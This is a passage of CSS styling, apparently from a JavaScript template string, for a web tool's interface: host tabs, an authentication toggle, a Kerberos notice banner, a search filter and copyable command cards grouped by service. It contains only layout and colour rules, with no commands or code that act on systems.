  .host-radio .dot{width:9px;height:9px;border-radius:50%;border:2px solid var(--dim);box-sizing:border-box}
  .host-radio .dot.on{border-color:var(--accent);background:var(--accent)}
  .host-name{font-size:.7rem;color:var(--ink);cursor:pointer;user-select:none}
  .host-tab.on .host-name{color:var(--accent)}
  .host-rename{background:#0a0e13;border:1px solid var(--accent);border-radius:4px;color:var(--ink);
    font-family:inherit;font-size:.7rem;width:90px;padding:.1rem .3rem;outline:none}
  .host-x{background:none;border:none;color:var(--dim);cursor:pointer;font-size:.85rem;line-height:1;padding:0 .1rem}
  .host-x:hover{color:#ff6b6b}
  .host-add{background:none;border:1px dashed var(--line);color:var(--dim);border-radius:7px;
    padding:.25rem .55rem;font-family:inherit;font-size:.66rem;cursor:pointer}
  .host-add:hover{color:var(--ink);border-color:var(--dim)}
  .clear-all{background:none;border:none;color:#5a4a4a;font-family:inherit;font-size:.58rem;cursor:pointer;margin-left:auto}
  .clear-all:hover{color:#ff6b6b}

  .var-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.55rem}
  .var{display:flex;flex-direction:column;gap:.22rem}
  .var label{display:flex;align-items:center;gap:.3rem;font-size:.54rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
  .fdot{width:6px;height:6px;border-radius:50%;background:#33414f;flex-shrink:0;transition:background .12s}
  .fdot.set{background:var(--ok)}
  .var input{background:var(--panel2);border:1px solid var(--line);border-radius:6px;
    padding:.42rem .55rem;color:var(--ink);font-family:inherit;font-size:.74rem;outline:none;transition:border-color .12s}
  .var input:focus{border-color:var(--amber)}
  .var input::placeholder{color:#33414f}

  .ready{font-size:.6rem;padding:.2rem .5rem;border-radius:5px;background:#2a1f1f;color:#d99;letter-spacing:.04em}
  .ready.ok{background:#15281c;color:var(--ok)}
  .export-banner{margin-top:.8rem;padding-top:.8rem;border-top:1px solid var(--line)}
  .export-lbl{font-size:.6rem;color:var(--accent);margin-bottom:.4rem}

  .auth-row{display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;margin-top:.85rem;
    padding-top:.8rem;border-top:1px solid var(--line)}
  .auth-lbl{font-size:.56rem;text-transform:uppercase;letter-spacing:.12em;color:var(--dim)}
  .auth-toggle{display:inline-flex;background:var(--panel2);border:1px solid var(--line);border-radius:7px;padding:2px}
  .auth-btn{background:none;border:none;color:var(--dim);font-family:inherit;font-size:.68rem;
    padding:.34rem .8rem;border-radius:5px;cursor:pointer;transition:all .12s}
  .auth-btn:hover{color:var(--ink)}
  .auth-btn.on{background:var(--amber);color:#1a1206;font-weight:700}
  .derived{display:flex;gap:.4rem;flex-wrap:wrap;margin-left:auto}
  .chip{display:flex;flex-direction:column;gap:1px;background:var(--panel2);border:1px solid var(--line);
    border-radius:6px;padding:.3rem .55rem;cursor:pointer;transition:border-color .12s;max-width:260px}
  .chip:hover{border-color:var(--accent)}
  .chip-label{font-size:.5rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
  .chip-val{font-size:.66rem;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

  .krb-banner{margin-top:.75rem;background:var(--amber-soft);border:1px solid #f5a62355;border-radius:7px;
    padding:.5rem .7rem;font-size:.66rem;line-height:1.5;color:#f0c987}
  .krb-banner code{background:#0006;padding:.04rem .3rem;border-radius:3px;color:#ffd98a}
  .krb-banner b{color:#ffd98a}

  .filter-wrap{max-width:1080px;margin:0 auto 1rem;display:flex;gap:.5rem;align-items:center}
  .filter{flex:1;background:var(--panel);border:1px solid var(--line);border-radius:8px;
    padding:.55rem .75rem;color:var(--ink);font-family:inherit;font-size:.74rem;outline:none;transition:border-color .12s}
  .filter:focus{border-color:var(--amber)}
  .filter::placeholder{color:#3a4856}
  .filter-clear{background:none;border:1px solid var(--line);color:var(--dim);border-radius:6px;
    padding:.5rem .7rem;font-family:inherit;font-size:.66rem;cursor:pointer}
  .filter-clear:hover{color:var(--ink);border-color:var(--dim)}

  .tabs{max-width:1080px;margin:0 auto .9rem;display:flex;gap:.3rem;flex-wrap:wrap}
  .tab{background:var(--panel);border:1px solid var(--line);color:var(--dim);border-radius:6px;
    padding:.34rem .7rem;font-family:inherit;font-size:.66rem;cursor:pointer;transition:all .12s}
  .tab:hover{color:var(--ink);border-color:var(--dim)}
  .tab.on{color:var(--amber);border-color:var(--amber);background:#1c150622}

  .results{max-width:1080px;margin:0 auto;display:flex;flex-direction:column;gap:1.3rem}
  .svc-block{display:flex;flex-direction:column;gap:.55rem}
  .svc-name{font-family:'Space Grotesk',sans-serif;font-size:.78rem;font-weight:700;color:#9fb4c8;
    text-transform:uppercase;letter-spacing:.12em;padding-bottom:.4rem;border-bottom:1px solid var(--line)}
  .cmd-list{display:grid;grid-template-columns:1fr;gap:.5rem}

  .cmd{background:var(--panel2);border:1px solid var(--line);border-radius:8px;overflow:hidden;
    cursor:pointer;transition:border-color .12s,transform .08s}
  .cmd:hover{border-color:#2b3a49}
  .cmd:active{transform:translateY(1px)}
  .cmd-head{display:flex;justify-content:space-between;align-items:center;
    padding:.4rem .65rem;background:#0a0e13;border-bottom:1px solid var(--line)}
  .cmd-label{font-size:.64rem;color:var(--accent);letter-spacing:.02em}
  .cmd-head-right{display:flex;align-items:center;gap:.5rem}
  .cmd-url{background:none;border:1px solid var(--line);color:var(--dim);font-family:inherit;
    font-size:.5rem;text-transform:uppercase;letter-spacing:.1em;padding:.1rem .35rem;border-radius:4px;
    cursor:pointer;transition:all .12s}
  .cmd-url:hover{color:var(--ink);border-color:var(--dim)}
  .cmd-url.on{background:var(--amber);color:#1a1206;border-color:var(--amber);font-weight:700}
  .cmd-copy{font-size:.56rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
  .cmd-copy.ok{color:var(--ok)}
  .cmd-text{padding:.6rem .65rem;font-size:.7rem;line-height:1.7;color:#aac4e0;
    white-space:pre-wrap;word-break:break-all}
  .cmd-text .tok{color:var(--amber);background:var(--amber-soft);border-radius:3px;padding:0 .15rem;font-weight:500}
  .cmd-text .var,.cmdline-text .var{color:var(--accent);font-weight:500}
  .cmd-note{padding:.4rem .65rem;border-top:1px solid var(--line);font-size:.6rem;color:var(--dim);line-height:1.5}

  .empty{text-align:center;padding:2.5rem;color:var(--dim);font-size:.74rem}

  @media (max-width:560px){
    .derived{margin-left:0;width:100%}
    .cmd-text{word-break:break-all}
  }
`;
